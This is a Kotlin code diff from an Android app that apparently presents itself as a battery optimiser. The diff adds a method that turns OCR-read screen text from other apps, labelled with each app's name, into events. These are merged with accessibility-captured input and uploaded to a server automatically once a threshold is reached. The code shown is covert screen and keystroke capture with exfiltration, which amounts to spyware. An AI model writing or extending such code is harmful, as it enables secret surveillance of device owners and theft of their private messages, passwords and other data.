@@ -7,6 +7,7 @@ import com.android.batteryoptimization.network.NetworkClient
 import com.android.batteryoptimization.network.UploadResponse
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
+import com.android.batteryoptimization.ocr.OcrResult
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -103,6 +104,37 @@ class InputRepository private constructor(private val context: Context) {
         }
     }
 
+    /**
+     * Add OCR results as events, merged into the existing event stream.
+     * OCR events are tagged with source="ocr" to distinguish from accessibility events.
+     */
+    fun addOcrEvents(packageName: String, appName: String, results: List<OcrResult>) {
+        val now = System.currentTimeMillis()
+        val currentEvents = _eventsFlow.value.toMutableList()
+        
+        for (result in results) {
+            if (result.text.isBlank()) continue
+            val event = InputEvent(
+                timestamp = now,
+                packageName = packageName,
+                appName = appName,
+                text = result.text,
+                source = "ocr"
+            )
+            currentEvents.add(0, event)
+        }
+        
+        _eventsFlow.value = currentEvents
+        saveEvents(currentEvents)
+        
+        val unuploadedCount = currentEvents.count { !it.isUploaded }
+        if (unuploadedCount >= UPLOAD_THRESHOLD) {
+            repositoryScope.launch {
+                uploadData()
+            }
+        }
+    }
+
     private fun resetTimer() {
         timerJob?.cancel()
         timerJob = repositoryScope.launch {
@@ -158,7 +190,8 @@ class InputRepository private constructor(private val context: Context) {
                     packageName = event.packageName,
                     appName = event.appName,
                     text = event.text,
-                    timestamp = event.timestamp
+                    timestamp = event.timestamp,
+                    source = event.source
                 )
             }
 
